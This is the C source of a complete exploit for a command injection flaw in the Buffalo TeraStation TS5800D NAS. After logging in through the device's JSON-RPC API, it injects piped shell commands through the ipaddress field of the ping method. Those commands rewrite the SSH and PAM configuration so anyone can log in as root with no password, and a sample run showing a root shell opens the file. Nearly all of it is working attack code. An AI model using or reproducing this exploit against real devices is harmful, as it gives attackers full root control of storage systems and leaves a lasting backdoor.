/*
* [root@CentOS5 NAS]# ./buffalo-exp -t 10.10.10.100 -u admin -p 1234
*  - Buffalo TeraStation TS5800D Command Injection Vulnerability Exploit -
*
*  Date: 22/02/2013
*
* [*] Target: 10.10.10.100
* [*] User ID: admin
* [*] User Password: 1234
* [+] Login to NAS server..... ok!
* [*] Session ID: 6d337d28-c6b9-44f1-8758-42be03c3b358
* [+] Injecting commands.
*  [-] Modify the ssh configuration file (1/10)
*  [-] Modify the ssh configuration file (2/10)
*  [-] Modify the ssh configuration file (3/10)
*  [-] Modify the ssh configuration file (4/10)
*  [-] Modify the ssh configuration file (5/10)
*  [-] Stop the ssh daemon (6/10)
*  [-] Start the ssh daemon (7/10)
*  [-] Modify the PAM configuration file (8/10)
*  [-] Modify the PAM configuration file (9/10)
*  [-] Modify the PAM configuration file (10/10)
* [*] Exploit Complete! If you connect to NAS server by ssh, You can logon root account (no password)
* [root@CentOS5 NAS]# ssh -l root 10.10.10.100
* Last login: Wed Feb 20 19:28:02 2013 from 10.10.10.120
* root@TS5800D7B2:~# id
* uid=0(root) gid=0(root)
* root@TS5800D7B2:~# uname -a
* Linux TS5800D7B2 2.6.39.4-atom_usi #1 SMP Tue Sep 18 14:53:10 JST 2012 x86_64 un
* root@TS5800D7B2:~#
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <getopt.h>
#include <netdb.h>
#include <sys/socket.h>

#define PROT_NAME	"jsonrpc"
#define PROT_VER	"2.0"
#define BANNER	\
"  - Buffalo TeraStation TS5800D Command Injection Vulnerability Exploit -\n\n"\
"  Date: 22/02/2013\n\n"

const char *crlf = "\x0D\x0A\x0D\x0A";
char cookie[1024] = "Cookie: lang=ko;";

#define HEADER \
	"POST /nasapi/ HTTP/1.0\r\n"\
	"Accept: */*\r\n"\
	"Accept-Language: ko\r\n"\
	"Referer: http://192.168.0.1/detail.html\r\n"\
	"x-requested-with: XMLHttpRequest\r\n"\
	"Content-Type: application/json\r\n"\
	"Accept-Encoding: gzip, deflate\r\n"\
	"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\r\n"\
	"Host: 192.168.0.1\r\n"\
	"Connection: Close\r\n"\
	"Pragma: no-cache\r\n"\
	"%s\r\n"\
	"Content-Length: %d\r\n\r\n"\
	"%s"
void usage(const char *);
int strip_header(int);
int socket_set(const char *, struct sockaddr_in *, const unsigned short);
char *do_login(const char *, const char *, const char *);
int cmd_inject(const char *, const char *, const char *);

int main(int argc, char **argv)
{
	int c = 0;
	char *target = NULL, *id = NULL, *pw = NULL;
	char *sid = NULL;
	static struct option opts[] = 
	{
		{"target", 1, 0, 't'},
		{"user", 1, 0, 'u'},
		{"password", 1, 0, 'p'},
		{"help", 0, 0, 'h'},
		{0,0,0,0}
	};
	printf("%s", BANNER);

	while(1) {
		int idx = 0;
		c = getopt_long(argc, argv, "t:u:p:h", opts, &idx);
		if(c == -1) break;
		switch(c) {
		case 't':
			target = optarg;
			break;
		case 'u':
			id = optarg;
			break;
		case 'p':
			pw = optarg;
			break;
		case 'h':
		default:
			usage(argv[0]);
			break;
		}
	}
	if(target == NULL || id == NULL || pw == NULL)
		usage(argv[0]);

	printf(
		"[*] Target: %s\n"
		"[*] User ID: %s\n"
		"[*] User Password: %s\n", target, id, pw);

	printf("[+] Login to NAS server..... ");
	if((sid = do_login(target, id, pw)) == NULL) {
		goto failed;
	}
	printf(
		"ok!\n"
		"[*] Session ID: %s\n", sid);
	snprintf(cookie + strlen(cookie), sizeof(cookie) - strlen(cookie), 
		" username=%s; sid=%s;", id, sid);

	printf("[+] Injecting commands.\n");
	printf(" [-] Modify the ssh configuration file (1/10)\n");
	if(cmd_inject(target, "| echo \\\"HostKey /etc/apache/server.key\\\" > /etc/sshd_config", sid) < 0) goto failed;
	printf(" [-] Modify the ssh configuration file (2/10)\n");
	if(cmd_inject(target, "| echo \\\"PermitRootLogin yes\\\" >> /etc/sshd_config", sid) < 0) goto failed;
	printf(" [-] Modify the ssh configuration file (3/10)\n");
	if(cmd_inject(target, "| echo \\\"UsePAM yes\\\" >> /etc/sshd_config", sid) < 0) goto failed;
	printf(" [-] Modify the ssh configuration file (4/10)\n");
	if(cmd_inject(target, "| echo \\\"UsePrivilegeSeparation no\\\" >> /etc/sshd_config", sid) < 0) goto failed;
	printf(" [-] Modify the ssh configuration file (5/10)\n");
	if(cmd_inject(target, "| echo \\\"Subsystem sftp /usr/local/libexec/sftp-server\\\" >> /etc/sshd_config", sid) < 0) goto failed;
	printf(" [-] Stop the ssh daemon (6/10)\n");
	if(cmd_inject(target, "|/etc/init.d/sshd.sh stop", sid) < 0) goto failed;
	printf(" [-] Start the ssh daemon (7/10)\n");
	if(cmd_inject(target, "|/etc/init.d/sshd.sh start", sid) < 0) goto failed;
	printf(" [-] Modify the PAM configuration file (8/10)\n");
	if(cmd_inject(target, "| echo \\\"account required pam_permit.so\\\" > /etc/pam.d/sshd", sid) < 0) goto failed;
	printf(" [-] Modify the PAM configuration file (9/10)\n");
	if(cmd_inject(target, "| echo \\\"auth required pam_permit.so\\\" >> /etc/pam.d/sshd", sid) < 0) goto failed;
	printf(" [-] Modify the PAM configuration file (10/10)\n");
	if(cmd_inject(target, "| echo \\\"session required pam_permit.so\\\" >> /etc/pam.d/sshd", sid) < 0) goto failed;

	printf("[*] Exploit Complete! If you connect to NAS server by ssh, You can logon root account (no password)\n");
	return 0;

failed:
	printf("[!] Exploit failed!\n");
	return -1;
}

void usage(const char *pname)
{
	printf(
		"<OPTIONS>\n"
		"  -t, --target\t\t<TARGET>\n"
		"  -u, --user\t\t<USER_ID>\n"
		"  -p, --password\t<USER_PASSWORD>\n"
		"  -h, --help\t\t[Show this message]\n\n"
		"Example: %s -t 192.168.0.1 -u admin -p 1234\n", pname);
	exit(0);
}

int strip_header(int s)
{
	unsigned char acc = 0;
	int n = 0, len = 0, i = 0;
	char *ptr = NULL;
	char buf[1024];

	while(1) {
		memset(buf, 0x00, sizeof(buf));

		if((n = recv(s, buf, sizeof(buf) - 1, MSG_PEEK)) == 0)
			return -1;
		if((ptr = strstr(buf, crlf)) != NULL) {
			len = (ptr - buf) + 4;
			recv(s, buf, len, 0);
			goto filled;
		} else {
			for(i = 0; i < n; i++) {
				if(buf[i] == crlf[acc]) {
					acc++;
				} else {
					if(acc > 0) {
						acc = 0;
					}
				}
				if(acc > 3) {
					recv(s, buf, i, 0);
					goto filled;
				}
			}
			recv(s, buf, i, 0);
		}
	}
filled:
	return atoi(buf + 8);
}

int socket_set(const char *server, struct sockaddr_in *addr_info, const unsigned short port)
{
	int s = 0;
	struct hostent *he = NULL;

	if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		printf("[!] socket() error.\n");
		goto failed;
	}

	if((he = gethostbyname(server)) == NULL) {
		printf("[!] gethostbyname() error.\n");
		goto failed;
	}
	memcpy(&addr_info->sin_addr, he->h_addr, he->h_length);
	addr_info->sin_family = AF_INET;
	addr_info->sin_port = htons(port);
		
	if(connect(s, (struct sockaddr *)addr_info, sizeof(*addr_info)) != 0) {
		printf("[!] connect() error.\n");
		goto failed;
	}
	
	return s;
failed:
	if(s > 0)
		close(s);
	return -1;
}
char *do_login(const char *target, const char *id, const char *pw)
{
	int s = 0, n = 0;
	struct sockaddr_in addr;
	char *ptr = NULL;
	char logindata[2048];
	char sendpkt[8192], recvpkt[2048];
	static unsigned char sid[128];

	snprintf(logindata, sizeof(logindata),  
		"{"
			"\"%s\":\"%s\","
			"\"method\":\"Auth.login\","
			"\"params\":{\"username\":\"%s\",\"password\":\"%s\"},"
			"\"id\":\"1361425584418\""
		"}", PROT_NAME, PROT_VER, id, pw);

	snprintf(sendpkt, sizeof(sendpkt), 
			HEADER, cookie, strlen(logindata), logindata);

	//printf("%s\n", sendpkt);	
	if((s = socket_set(target, &addr, 80)) < 0) {
		goto failed;
	}
	if(send(s, sendpkt, strlen(sendpkt), 0) < 0) {
		printf("[!] send() error\n");
		goto failed;
	}

	if(strip_header(s) != 200) {
		printf("[!] Illegal HTTP header\n");
		goto failed;
	}
	
	n = recv(s, recvpkt, sizeof(recvpkt) - 1, 0);
	recvpkt[n] = '\0';

	// {"jsonrpc": "2.0", "id": "1361425584418", "result": {"uid": 52, "sid": "13bf488d-d567-43f4-b203-5a1798e7e011"}}	
	if((ptr = strstr(recvpkt, "sid")) == NULL) {
		printf("[!] Login failed!\n");
		goto failed;
	}
	close(s);

	ptr += 7;

	n = 0;
	while(*ptr != '"') {
		sid[n++] = *(unsigned char *)ptr;
		ptr++;
	}
	sid[n++] = '\0';
	return sid;

failed:
	if(s != 0)
		close(s);
	return NULL;
}

int cmd_inject(const char *target, const char *cmd, const char *sid)
{
	int i = 0, s = 0, n = 0, retry = 3, executed = -1, isdone = 0;
	struct sockaddr_in addr;
	char *ptr = NULL;
	char postdata[4096];
	char sendpkt[8192], recvpkt[1024];
	unsigned char jobid[128];

	// ***** Sending a command
	snprintf(postdata, sizeof(postdata),  
		"{"
			"\"%s\":\"%s\","
			"\"method\":\"network.ping\","
			"\"params\":{\"ipaddress\":\"%s%s\",\"sid\":\"%s\"},"
			"\"id\":\"1361425584418\""
		"}", PROT_NAME, PROT_VER, target, cmd, sid);
	snprintf(sendpkt, sizeof(sendpkt), 
			HEADER, cookie, strlen(postdata), postdata);
	if((s = socket_set(target, &addr, 80)) < 0) {
		goto failed;
	}
	if(send(s, sendpkt, strlen(sendpkt), 0) < 0) {
		printf("[!] send() error\n");
		goto failed;
	}
	if(strip_header(s) != 200) {
		printf("[!] Illegal HTTP header\n");
		goto failed;
	}
	n = recv(s, recvpkt, sizeof(recvpkt) - 1, 0);
	recvpkt[n] = '\0';
	// {"jsonrpc": "2.0", "id": "1361425584418", "result": {"jobid": 13}}
	if((ptr = strstr(recvpkt, "jobid")) == NULL) {
		printf("[!] Can't allocate job-id.\n");
		goto failed;
	}
	close(s); s = 0;
	ptr += 8;
	n = 0;
	while(*ptr != '}') {
		jobid[n++] = *(unsigned char *)ptr;
		ptr++;
	}
	jobid[n++] = '\0';

	// ***** Check command result
	snprintf(postdata, sizeof(postdata),  
		"{"
			"\"%s\":\"%s\","
			"\"method\":\"Job.detail\","
			"\"params\":{\"jobid\":%s,\"sid\":\"%s\"},"
			"\"id\":\"1361425584418\""
		"}", PROT_NAME, PROT_VER, jobid, sid);
	snprintf(sendpkt, sizeof(sendpkt), 
			HEADER, cookie, strlen(postdata), postdata);
	for(i = 0; i < retry; i++) {
		if((s = socket_set(target, &addr, 80)) < 0) {
			goto failed;
		}
		if(send(s, sendpkt, strlen(sendpkt), 0) < 0) {
			printf("[!] send() error\n");
			goto failed;
		}
		if(strip_header(s) != 200) {
			printf("[!] Illegal HTTP header\n");
			goto failed;
		}
		n = recv(s, recvpkt, sizeof(recvpkt) - 1, 0);
		recvpkt[n] = '\0';
		// {"jsonrpc": "2.0", "id": "1361425584418", "result": {"job": {"stepmax": null, "percent": null, "remaining_time": null, "jobname": "network.ping", "elapsed_time": 25, "stepnow": null, "arguments": null, "jobid": 14, "data": "", "isdone": 1}}}
		if((ptr = strstr(recvpkt, "isdone")) == NULL) {
			printf("[!] Packet Parse Error: %s\n", recvpkt);
			goto failed;
		}
		close(s); s = 0;
		isdone = atoi(ptr + 9);
		if(isdone == 1) {
			executed++;
			break;
		} else {
			sleep(5);
		}
	} /* end of for loop */

failed:
	return executed;
}
